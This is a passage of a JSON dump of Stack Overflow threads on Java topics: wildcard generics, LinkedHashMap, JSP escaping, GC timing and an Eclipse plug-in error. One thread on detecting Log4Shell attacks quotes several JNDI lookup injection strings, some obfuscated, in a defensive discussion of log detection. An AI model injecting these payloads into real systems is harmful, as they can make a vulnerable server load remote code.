time.\r\n\r\nLet&#39;s make this simpler and look at `Map&lt;String, ? extends Number&gt;`, to which you could assign either of\r\n\r\n    Map&lt;String, ? extends Number&gt; map = new HashMap&lt;String, Integer&gt;();\r\n    Map&lt;String, ? extends Number&gt; map = new HashMap&lt;String, Double&gt;();\r\n\r\nHowever, when calling `map.getOrDefault(Object k, V defaultValue)`, there is no way to determine the type for `defaultValue` at compile time, since the actual type may change at runtime, even for the very same assignment (not the same instance though).\r\n\r\n    // compile-time error, could require a Double or any other Number-type\r\n    Number i = map.getOrDefault(&quot;foo&quot;, (Number)Integer.MAX_VALUE);","title":"Java Map.getOrDefault with bounded wildcard","body":"<p>You can use <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#unmodifiableMap-java.util.Map-\" rel=\"nofollow noreferrer\"><code>Collections.unmodifiableMap</code></a> to view your map as <code>Map&lt;String, Map&lt;String, Integer&gt;&gt;</code>.</p>\n<pre><code>Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt; mapOfMaps = new HashMap&lt;&gt;();\nMap&lt;String, Map&lt;String, Integer&gt;&gt; view = Collections.unmodifiableMap(mapOfMaps);\nMap&lt;String, Integer&gt; map = view.getOrDefault(&quot;foo&quot;, Collections.emptyMap());\n</code></pre>\n<p>In a single line, however, it still looks ugly, since you need to specify the generic type arguments for <code>unmodifiableMap</code>.</p>\n<pre><code>Map&lt;String, Integer&gt; map = Collections.&lt;String, Map&lt;String, Integer&gt;&gt;\n    unmodifiableMap(mapOfMaps).getOrDefault(&quot;foo&quot;, Collections.emptyMap());\n</code></pre>\n<h3>Explanation</h3>\n<p>You cannot call any method that has an unbounded or <code>extends</code>-bounded wildcard parameter, because the exact type of the wildcard is not known at compile time.</p>\n<p>Let's make this simpler and look at <code>Map&lt;String, ? extends Number&gt;</code>, to which you could assign either of</p>\n<pre><code>Map&lt;String, ? extends Number&gt; map = new HashMap&lt;String, Integer&gt;();\nMap&lt;String, ? extends Number&gt; map = new HashMap&lt;String, Double&gt;();\n</code></pre>\n<p>However, when calling <code>map.getOrDefault(Object k, V defaultValue)</code>, there is no way to determine the type for <code>defaultValue</code> at compile time, since the actual type may change at runtime, even for the very same assignment (not the same instance though).</p>\n<pre><code>// compile-time error, could require a Double or any other Number-type\nNumber i = map.getOrDefault(&quot;foo&quot;, (Number)Integer.MAX_VALUE);\n</code></pre>\n"}],"owner":{"account_id":16944613,"reputation":418,"user_id":12255620,"display_name":"MBobrik"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":355,"favorite_count":0,"down_vote_count":0,"up_vote_count":7,"accepted_answer_id":70362275,"answer_count":2,"score":7,"last_activity_date":1639568920,"creation_date":1639548213,"question_id":70359061,"body_markdown":"&lt;!-- language-all: lang-java --&gt;\r\n\r\nGot a `Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt; mapOfMaps` variable.\r\n\r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.get(&quot;aaa&quot;);\r\n```\r\nworks, but \r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,Collections.emptyMap());\r\n```\r\nsays \r\n&gt; The method getOrDefault(Object, capture#1-of ? extends Map&lt;String,Integer&gt;) in the type Map&lt;String,capture#1-of ? extends Map&lt;String,Integer&gt;&gt; is not applicable for the arguments (String, Map&lt;String,Integer&gt;)\r\n\r\nthe same goes for\r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,Collections.&lt;String,Integer&gt;emptyMap());\r\n```\r\nor\r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,(Map&lt;String,Integer&gt;)Collections.EMPTY_MAP);\r\n```\r\nor even\r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,new HashMap&lt;String, Integer&gt;());\r\n```\r\n\r\n----------\r\n\r\nIs there a way of using the getOrDefault like that or do I have to use the clunky way ?\r\n```\r\nMap&lt;String, Integer&gt; result = mapOfMaps.get(&quot;aaa&quot;);\r\nif( result == null ) {\r\n  result = Collections.emptyMap();\r\n}\r\n```","title":"Java Map.getOrDefault with bounded wildcard","body":"\n<p>Got a <code>Map&lt;String, ? extends Map&lt;String, Integer&gt;&gt; mapOfMaps</code> variable.</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.get(&quot;aaa&quot;);\n</code></pre>\n<p>works, but</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,Collections.emptyMap());\n</code></pre>\n<p>says</p>\n<blockquote>\n<p>The method getOrDefault(Object, capture#1-of ? extends Map&lt;String,Integer&gt;) in the type Map&lt;String,capture#1-of ? extends Map&lt;String,Integer&gt;&gt; is not applicable for the arguments (String, Map&lt;String,Integer&gt;)</p>\n</blockquote>\n<p>the same goes for</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,Collections.&lt;String,Integer&gt;emptyMap());\n</code></pre>\n<p>or</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,(Map&lt;String,Integer&gt;)Collections.EMPTY_MAP);\n</code></pre>\n<p>or even</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.getOrDefault(&quot;aaa&quot;,new HashMap&lt;String, Integer&gt;());\n</code></pre>\n<hr />\n<p>Is there a way of using the getOrDefault like that or do I have to use the clunky way ?</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, Integer&gt; result = mapOfMaps.get(&quot;aaa&quot;);\nif( result == null ) {\n  result = Collections.emptyMap();\n}\n</code></pre>\n"},{"tags":["java","hashmap"],"comments":[{"owner":{"account_id":299251,"reputation":335905,"user_id":605744,"accept_rate":100,"display_name":"Tomasz Nurkiewicz"},"score":14,"creation_date":1337720949,"post_id":10710193,"comment_id":13907293,"body_markdown":"http://docs.oracle.com/javase/7/docs/api/java/util/LinkedHashMap.html","body":"<a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/LinkedHashMap.html\" rel=\"nofollow noreferrer\">docs.oracle.com/javase/7/docs/api/java/util/LinkedHashMap.ht&zwnj;&#8203;ml</a>"}],"answers":[{"tags":[],"owner":{"account_id":152622,"reputation":490044,"user_id":367273,"accept_rate":96,"display_name":"NPE"},"down_vote_count":0,"up_vote_count":1250,"is_accepted":true,"score":1250,"last_activity_date":1337721307,"creation_date":1337720958,"answer_id":10710205,"question_id":10710193,"body_markdown":"[`LinkedHashMap`][1] is precisely what you&#39;re looking for.\r\n\r\nIt is exactly like `HashMap`, except that when you iterate over it, it presents the items in the insertion order.\r\n\r\n\r\n  [1]: http://docs.oracle.com/javase/6/docs/api/java/util/LinkedHashMap.html","title":"How to preserve insertion order in HashMap?","body":"<p><a href=\"http://docs.oracle.com/javase/6/docs/api/java/util/LinkedHashMap.html\" rel=\"noreferrer\"><code>LinkedHashMap</code></a> is precisely what you're looking for.</p>\n\n<p>It is exactly like <code>HashMap</code>, except that when you iterate over it, it presents the items in the insertion order.</p>\n"},{"tags":[],"owner":{"account_id":138557,"reputation":42623,"user_id":343568,"accept_rate":100,"display_name":"nicholas.hauschild"},"down_vote_count":2,"up_vote_count":80,"is_accepted":false,"score":78,"last_activity_date":1639568841,"creation_date":1337721116,"answer_id":10710241,"question_id":10710193,"body_markdown":"[`HashMap`][1] is unordered per the second line of the documentation:\r\n\r\n&gt; This class makes no guarantees as to the order of the map; in particular, it does not guarantee that the order will remain constant over time.\r\n\r\nPerhaps you can do as aix suggests and use a `LinkedHashMap`, or another ordered collection. Take a look on javapractices.com&#39;s guide on [Choosing the right Collection][2].\r\n\r\n\r\n  [1]: http://docs.oracle.com/javase/6/docs/api/java/util/HashMap.html\r\n  [2]: http://www.javapractices.com/topic/TopicAction.do?Id=65","title":"How to preserve insertion order in HashMap?","body":"<p><a href=\"http://docs.oracle.com/javase/6/docs/api/java/util/HashMap.html\" rel=\"noreferrer\"><code>HashMap</code></a> is unordered per the second line of the documentation:</p>\n<blockquote>\n<p>This class makes no guarantees as to the order of the map; in particular, it does not guarantee that the order will remain constant over time.</p>\n</blockquote>\n<p>Perhaps you can do as aix suggests and use a <code>LinkedHashMap</code>, or another ordered collection. Take a look on javapractices.com's guide on <a href=\"http://www.javapractices.com/topic/TopicAction.do?Id=65\" rel=\"noreferrer\">Choosing the right Collection</a>.</p>\n"}],"owner":{"account_id":1051439,"reputation":24343,"user_id":1055279,"accept_rate":99,"display_name":"realtebo"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":448717,"favorite_count":0,"down_vote_count":2,"up_vote_count":578,"closed_date":1441975700,"accepted_answer_id":10710205,"answer_count":2,"score":576,"last_activity_date":1639568841,"creation_date":1337720903,"question_id":10710193,"body_markdown":"I&#39;m using a `HashMap`. When I iterate over the map, the data is returned in (often the same) random order. But the data was inserted in a specific order, and I need to preserve the insertion order. How can I do this?","title":"How to preserve insertion order in HashMap?","body":"<p>I'm using a <code>HashMap</code>. When I iterate over the map, the data is returned in (often the same) random order. But the data was inserted in a specific order, and I need to preserve the insertion order. How can I do this?</p>\n"},{"tags":["java","jsp","el","html-encode"],"comments":[{"owner":{"account_id":9396,"reputation":14580,"user_id":17335,"display_name":"Chii"},"score":2,"creation_date":1293196763,"post_id":4526502,"comment_id":4958353,"body_markdown":"If IDE is the only problem with the above, then get another IDE - Intellij IDEA is great.","body":"If IDE is the only problem with the above, then get another IDE - Intellij IDEA is great."},{"owner":{"account_id":9435,"reputation":6733,"user_id":17439,"accept_rate":86,"display_name":"Martijn"},"score":0,"creation_date":1293197371,"post_id":4526502,"comment_id":4958420,"body_markdown":"My main problem is it looks ugly. :-) I don&#39;t want to nest a tag in an attribute of another tag.","body":"My main problem is it looks ugly. :-) I don&#39;t want to nest a tag in an attribute of another tag."},{"owner":{"account_id":9435,"reputation":6733,"user_id":17439,"accept_rate":86,"display_name":"Martijn"},"score":0,"creation_date":1293203161,"post_id":4526502,"comment_id":4958899,"body_markdown":"I don&#39;t blame Eclipse; it&#39;s a very complicated, non-compositional templating language which makes it very difficult to do proper highlighting/error reporting without writing a full compiler for it (which is not Eclipse&#39;s job here IMHO).","body":"I don&#39;t blame Eclipse; it&#39;s a very complicated, non-compositional templating language which makes it very difficult to do proper highlighting/error reporting without writing a full compiler for it (which is not Eclipse&#39;s job here IMHO)."}],"answers":[{"tags":[],"owner":{"account_id":52822,"reputation":1088970,"user_id":157882,"accept_rate":93,"display_name":"BalusC"},"down_vote_count":0,"up_vote_count":33,"is_accepted":true,"score":33,"last_activity_date":1293196494,"creation_date":1293196494,"answer_id":4526551,"question_id":4526502,"body_markdown":"Use [`fn:escapeXml()`][1].\r\n\r\n    &lt;%@ taglib prefix=&quot;fn&quot; uri=&quot;http://java.sun.com/jsp/jstl/functions&quot; %&gt;\r\n    ...\r\n    &lt;param name=&quot;FlashVars&quot; value=&quot;${fn:escapeXml(flashVars)}&quot; /&gt;\r\n\r\n\r\n  [1]: http://download.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/fn/escapeXml.fn.html","title":"How to HTML-encode in the JSP expression language?","body":"<p>Use <a href=\"http://download.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/fn/escapeXml.fn.html\" rel=\"noreferrer\"><code>fn:escapeXml()</code></a>.</p>\n\n<pre><code>&lt;%@ taglib prefix=\"fn\" uri=\"http://java.sun.com/jsp/jstl/functions\" %&gt;\n...\n&lt;param name=\"FlashVars\" value=\"${fn:escapeXml(flashVars)}\" /&gt;\n</code></pre>\n"}],"owner":{"account_id":9435,"reputation":6733,"user_id":17439,"accept_rate":86,"display_name":"Martijn"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":22553,"favorite_count":0,"down_vote_count":0,"up_vote_count":20,"accepted_answer_id":4526551,"answer_count":1,"score":20,"last_activity_date":1639568721,"creation_date":1293195788,"question_id":4526502,"body_markdown":"Consider the following piece of JSP:\r\n\r\n    &lt;param name=&quot;FlashVars&quot; value=&quot;${flashVars}&quot; /&gt;\r\n\r\nThe value of `${flashVars}` contains ampersands and needs to be encoded before it is output. Instead, JSP expects the value of `${flashVars}` to be a piece of HTML and outputs the ampersands verbatim, resulting in bad HTML.\r\n\r\nI found out that I can get the value to be encoded if I write it like this:\r\n\r\n    &lt;param name=&quot;FlashVars&quot; value=&quot;&lt;c:out value=&quot;${flashVars}&quot;/&gt;&quot; /&gt;\r\n\r\nBut this looks really ugly and confuses my IDE to boot. Is there a better way to get the same result?\r\n","title":"How to HTML-encode in the JSP expression language?","body":"<p>Consider the following piece of JSP:</p>\n\n<pre><code>&lt;param name=\"FlashVars\" value=\"${flashVars}\" /&gt;\n</code></pre>\n\n<p>The value of <code>${flashVars}</code> contains ampersands and needs to be encoded before it is output. Instead, JSP expects the value of <code>${flashVars}</code> to be a piece of HTML and outputs the ampersands verbatim, resulting in bad HTML.</p>\n\n<p>I found out that I can get the value to be encoded if I write it like this:</p>\n\n<pre><code>&lt;param name=\"FlashVars\" value=\"&lt;c:out value=\"${flashVars}\"/&gt;\" /&gt;\n</code></pre>\n\n<p>But this looks really ugly and confuses my IDE to boot. Is there a better way to get the same result?</p>\n"},{"tags":["java","security","web","logging","log4j2"],"comments":[{"owner":{"account_id":3253983,"reputation":1481,"user_id":2743585,"display_name":"wi2ard"},"score":1,"creation_date":1639559445,"post_id":70358072,"comment_id":124377042,"body_markdown":"Are you trying to blacklist some regex to sanitize your input? That is just a partial solution, you will never have any guarantee that you didn&#39;t miss a pattern. To make sure your input is safe you should instead whitelist what you accept, not blacklist what you reject.","body":"Are you trying to blacklist some regex to sanitize your input? That is just a partial solution, you will never have any guarantee that you didn&#39;t miss a pattern. To make sure your input is safe you should instead whitelist what you accept, not blacklist what you reject."}],"answers":[{"tags":[],"owner":{"account_id":1642943,"reputation":19407,"user_id":1515052,"accept_rate":90,"display_name":"Simulant"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639568553,"creation_date":1639568553,"answer_id":70363095,"question_id":70358072,"body_markdown":"there might not be infinite combinations, but way to many ways to describe the JNDI LDAP protocol to describe all of them in one regular expression to detect them.\r\n\r\nOne more example:\r\n`${jndi:${lower:l}${lower:d}ap://badurl}` \r\n\r\nyou will find way more in blogposts about the detection of an attack.\r\n\r\nYou should search your logs for the main simple patterns, to identify if you were attacked, but the absence of a detection is not a guarantee that you are not attacked. Like a test can only cover if the tested input works, but not validate if the function under test behaves correctly for every input.","title":"How many log4j2 jndi lookup pattern can be?","body":"<p>there might not be infinite combinations, but way to many ways to describe the JNDI LDAP protocol to describe all of them in one regular expression to detect them.</p>\n<p>One more example:\n<code>${jndi:${lower:l}${lower:d}ap://badurl}</code></p>\n<p>you will find way more in blogposts about the detection of an attack.</p>\n<p>You should search your logs for the main simple patterns, to identify if you were attacked, but the absence of a detection is not a guarantee that you are not attacked. Like a test can only cover if the tested input works, but not validate if the function under test behaves correctly for every input.</p>\n"}],"owner":{"account_id":4391645,"reputation":532,"user_id":3579818,"accept_rate":86,"display_name":"taymedee"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":734,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":1,"score":0,"last_activity_date":1639568553,"creation_date":1639538242,"question_id":70358072,"body_markdown":"Recently [log4j2 vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) has been widely spread, for the basic JNDI lookup can be as easy as \r\n\r\n```\r\n\r\n${jndi:ldap://127.0.0.1:3089/}\r\n\r\n```\r\n\r\nBut this isn&#39;t a common way to doing it. I had seed some of the hacker trying to use pattern lookup as complex as \r\n\r\n```\r\n\r\n${${::-j}${::-n}${::-d}${::-i})\r\n\r\n```\r\n\r\nI would like to know where is this document based on? How can we know what other the pattern they can inject?\r\n\r\n\r\n\r\n\r\n\r\n\r\n","title":"How many log4j2 jndi lookup pattern can be?","body":"<p>Recently <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44228\" rel=\"nofollow noreferrer\">log4j2 vulnerability</a> has been widely spread, for the basic JNDI lookup can be as easy as</p>\n<pre><code>\n${jndi:ldap://127.0.0.1:3089/}\n\n</code></pre>\n<p>But this isn't a common way to doing it. I had seed some of the hacker trying to use pattern lookup as complex as</p>\n<pre><code>\n${${::-j}${::-n}${::-d}${::-i})\n\n</code></pre>\n<p>I would like to know where is this document based on? How can we know what other the pattern they can inject?</p>\n"},{"tags":["java","performance","garbage-collection"],"comments":[{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1639574850,"post_id":70363050,"comment_id":124382994,"body_markdown":"How do you conclude that the method execution should take X&#160;ms? Are you assuming interpreted execution, C1 compiled execution or C2 compiled execution?","body":"How do you conclude that the method execution should take X ms? Are you assuming interpreted execution, C1 compiled execution or C2 compiled execution?"},{"owner":{"account_id":4821703,"reputation":5934,"user_id":3892213,"accept_rate":80,"display_name":"best wishes"},"score":0,"creation_date":1639624522,"post_id":70363050,"comment_id":124398821,"body_markdown":"so, let&#39;s say GC is happening every 60secs, I am considering non GC execution time as X","body":"so, let&#39;s say GC is happening every 60secs, I am considering non GC execution time as X"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1639641835,"post_id":70363050,"comment_id":124402170,"body_markdown":"That does not answer the question, not even remotely.","body":"That does not answer the question, not even remotely."},{"owner":{"account_id":4821703,"reputation":5934,"user_id":3892213,"accept_rate":80,"display_name":"best wishes"},"score":0,"creation_date":1639643052,"post_id":70363050,"comment_id":124402563,"body_markdown":"in our tests jvm is running in server mode and we are hitting only 1 code path, so i assume it would be c2 compiled.","body":"in our tests jvm is running in server mode and we are hitting only 1 code path, so i assume it would be c2 compiled."},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1639643778,"post_id":70363050,"comment_id":124402796,"body_markdown":"When you are benchmarking, you should have multiple runs, getting an interval, rather than a single execution time. Then, if you have a recent JVM, do a run with sufficient RAM and [GC turned off](https://blogs.oracle.com/javamagazine/post/epsilon-the-jdks-do-nothing-garbage-collector) to rule out GC effects. Then, you can compare the results…","body":"When you are benchmarking, you should have multiple runs, getting an interval, rather than a single execution time. Then, if you have a recent JVM, do a run with sufficient RAM and <a href=\"https://blogs.oracle.com/javamagazine/post/epsilon-the-jdks-do-nothing-garbage-collector\" rel=\"nofollow noreferrer\">GC turned off</a> to rule out GC effects. Then, you can compare the results…"},{"owner":{"account_id":4821703,"reputation":5934,"user_id":3892213,"accept_rate":80,"display_name":"best wishes"},"score":0,"creation_date":1639644062,"post_id":70363050,"comment_id":124402886,"body_markdown":"yes, X can not be a single number but can be better described as a range of values. I am considering the mean as X. lets say gc is happening every 60 sec and Gc duration is 20ms. We are considering 55 sec&#39;s avg duration as X here( basically ignoring the 5 sec values around GC)","body":"yes, X can not be a single number but can be better described as a range of values. I am considering the mean as X. lets say gc is happening every 60 sec and Gc duration is 20ms. We are considering 55 sec&#39;s avg duration as X here( basically ignoring the 5 sec values around GC)"},{"owner":{"account_id":4821703,"reputation":5934,"user_id":3892213,"accept_rate":80,"display_name":"best wishes"},"score":0,"creation_date":1639649480,"post_id":70363050,"comment_id":124404941,"body_markdown":"Let us [continue this discussion in chat](https://chat.stackoverflow.com/rooms/240195/discussion-between-best-wishes-and-holger).","body":"Let us <a href=\"https://chat.stackoverflow.com/rooms/240195/discussion-between-best-wishes-and-holger\">continue this discussion in chat</a>."}],"owner":{"account_id":4821703,"reputation":5934,"user_id":3892213,"accept_rate":80,"display_name":"best wishes"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":57,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639568356,"creation_date":1639568356,"question_id":70363050,"body_markdown":"Let&#39;s say I have a methodA which takes X ms in execution. And let&#39;s say application GC takes Y ms. Ideally my overall method time should be bound between [X,X+Y]. But in real life we are seeing the execution time to be way more than X+Y. \r\n\r\nWhat other activities in JVM can contribute to this? We have looked at [safepointing time][1], but did not find it to be a major contributor.\r\nWhat are the tools using which this additional time taken can be measured? \r\n\r\n\r\n  [1]: https://stackoverflow.com/a/19201753/3892213","title":"Java Method execution time and GC times","body":"<p>Let's say I have a methodA which takes X ms in execution. And let's say application GC takes Y ms. Ideally my overall method time should be bound between [X,X+Y]. But in real life we are seeing the execution time to be way more than X+Y.</p>\n<p>What other activities in JVM can contribute to this? We have looked at <a href=\"https://stackoverflow.com/a/19201753/3892213\">safepointing time</a>, but did not find it to be a major contributor.\nWhat are the tools using which this additional time taken can be measured?</p>\n"},{"tags":["java","eclipse","javafx","eclipse-plugin"],"comments":[{"owner":{"account_id":1180113,"reputation":152325,"user_id":1155209,"display_name":"jewelsea"},"score":3,"creation_date":1639429143,"post_id":70340823,"comment_id":124341889,"body_markdown":"openjfx.io have a guide to [getting started with JavaFX using Eclipse](https://openjfx.io/openjfx-docs/#IDE-Eclipse).","body":"openjfx.io have a guide to <a href=\"https://openjfx.io/openjfx-docs/#IDE-Eclipse\" rel=\"nofollow noreferrer\">getting started with JavaFX using Eclipse</a>."},{"owner":{"account_id":8692823,"reputation":31810,"user_id":6505250,"display_name":"howlger"},"score":0,"creation_date":1639466122,"post_id":70340823,"comment_id":124348973,"body_markdown":"With which result do you tried to update Eclipse (see also https://stackoverflow.com/a/46273081/6505250 )? What does _Help &gt; About Eclipse IDE_ show?","body":"With which result do you tried to update Eclipse (see also <a href=\"https://stackoverflow.com/a/46273081/6505250\">stackoverflow.com/a/46273081/6505250</a> )? What does <i>Help &gt; About Eclipse IDE</i> show?"},{"owner":{"account_id":2518243,"reputation":203472,"user_id":2189127,"display_name":"James_D"},"score":0,"creation_date":1639525944,"post_id":70340823,"comment_id":124369927,"body_markdown":"You need to fix the title to this question. This is not about installing JavaFX, it is about installing the e(fx)clipse Eclipse plug-in.","body":"You need to fix the title to this question. This is not about installing JavaFX, it is about installing the e(fx)clipse Eclipse plug-in."},{"owner":{"account_id":23130976,"reputation":1,"user_id":17235972,"display_name":"StarGazer4234"},"score":0,"creation_date":1639568189,"post_id":70340823,"comment_id":124380290,"body_markdown":"done sorry for that","body":"done sorry for that"},{"owner":{"account_id":23130976,"reputation":1,"user_id":17235972,"display_name":"StarGazer4234"},"score":0,"creation_date":1639568255,"post_id":70340823,"comment_id":124380322,"body_markdown":"i updated eclipse from help----&gt;check for updates","body":"i updated eclipse from help----&gt;check for updates"},{"owner":{"account_id":23130976,"reputation":1,"user_id":17235972,"display_name":"StarGazer4234"},"score":0,"creation_date":1639570876,"post_id":70340823,"comment_id":124381324,"body_markdown":"Version: 2021-12 (4.22.0)\nBuild id: 20211202-1639\n(c) Copyright Eclipse contributors and others 2000, 2021.  All rights reserved. Eclipse and the Eclipse logo are trademarks of the Eclipse Foundation, Inc., https://www.eclipse.org/. The Eclipse logo cannot be altered without Eclipses permission. Eclipse logos are provided for use under the Eclipse logo and trademark guidelines, https://www.eclipse.org/logotm/. Oracle and Java are trademarks or registered trademarks of Oracle and/or its affiliates. Other names may be trademarks of their respective owners.","body":"Version: 2021-12 (4.22.0) Build id: 20211202-1639 (c) Copyright Eclipse contributors and others 2000, 2021.  All rights reserved. Eclipse and the Eclipse logo are trademarks of the Eclipse Foundation, Inc., <a href=\"https://www.eclipse.org/\" rel=\"nofollow noreferrer\">eclipse.org</a>. The Eclipse logo cannot be altered without Eclipses permission. Eclipse logos are provided for use under the Eclipse logo and trademark guidelines, <a href=\"https://www.eclipse.org/logotm/\" rel=\"nofollow noreferrer\">eclipse.org/logotm</a>. Oracle and Java are trademarks or registered trademarks of Oracle and/or its affiliates. Other names may be trademarks of their respective owners."},{"owner":{"account_id":23130976,"reputation":1,"user_id":17235972,"display_name":"StarGazer4234"},"score":0,"creation_date":1639570903,"post_id":70340823,"comment_id":124381334,"body_markdown":"so i think i&#39;m sure i&#39;m on the newest update of this month","body":"so i think i&#39;m sure i&#39;m on the newest update of this month"}],"owner":{"account_id":23130976,"reputation":1,"user_id":17235972,"display_name":"StarGazer4234"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":205,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639568172,"creation_date":1639428970,"question_id":70340823,"body_markdown":"    Cannot complete the install because one or more required items could not be found.\r\n    Software currently installed: e(fx)clipse - IDE 3.7.0.202010120832 (org.eclipse.fx.ide.feature.feature.group 3.7.0.202010120832)\r\n    Missing requirement: JDT UI Tooling for JavaFX 3.7.0.202010120832 (org.eclipse.fx.ide.jdt.ui 3.7.0.202010120832) requires &#39;osgi.bundle; org.eclipse.emf.databinding 1.2.0&#39; but it could not be found\r\n    Cannot satisfy dependency:\r\n    From: e(fx)clipse - IDE - Basic 3.7.0.202010120832 (org.eclipse.fx.ide.basic.feature.feature.group 3.7.0.202010120832)\r\n    To: org.eclipse.equinox.p2.iu; org.eclipse.fx.ide.jdt.ui [3.7.0.202010120832,3.7.0.202010120832]\r\n    Cannot satisfy dependency:\r\n    From: e(fx)clipse - IDE 3.7.0.202010120832 (org.eclipse.fx.ide.feature.feature.group 3.7.0.202010120832)\r\n    To: org.eclipse.equinox.p2.iu; org.eclipse.fx.ide.basic.feature.feature.group [3.7.0.202010120832,3.7.0.202010120832]\r\ni get that it asks for me to install something but i don&#39;t really get it, everything is supposed to be up to date i tried to update eclipse and i have 17 java SDK, what is missing?","title":"i&#39;m having an error while trying to install e(fx)clipse Eclipse plug-in on Eclipse from Market Place","body":"<pre><code>Cannot complete the install because one or more required items could not be found.\nSoftware currently installed: e(fx)clipse - IDE 3.7.0.202010120832 (org.eclipse.fx.ide.feature.feature.group 3.7.0.202010120832)\nMissing requirement: JDT UI Tooling for JavaFX 3.7.0.202010120832 (org.eclipse.fx.ide.jdt.ui 3.7.0.202010120832) requires 'osgi.bundle; org.eclipse.emf.databinding 1.2.0' but it could not be found\nCannot satisfy dependency:\nFrom: e(fx)clipse - IDE - Basic 3.7.0.202010120832 (org.eclipse.fx.ide.basic.feature.feature.group 3.7.0.202010120832)\nTo: org.eclipse.equinox.p2.iu; org.eclipse.fx.ide.jdt.ui [3.7.0.202010120832,3.7.0.202010120832]\nCannot satisfy dependency:\nFrom: e(fx)clipse - IDE 3.7.0.202010120832 (org.eclipse.fx.ide.feature.feature.group 3.7.0.202010120832)\nTo: org.eclipse.equinox.p2.iu; org.eclipse.fx.ide.basic.feature.feature.group [3.7.0.202010120832,3.7.0.202010120832]\n</code></pre>\n<p>i get that it asks for me to install something but i don't really get it, everything is supposed to be up to date i tried to update eclipse and i have 17 java SDK, what is missing?</p>\n"}],"has_more":true,"quota_max":10000,"quota_remaining":8233,"page":1759,"page_size":100}
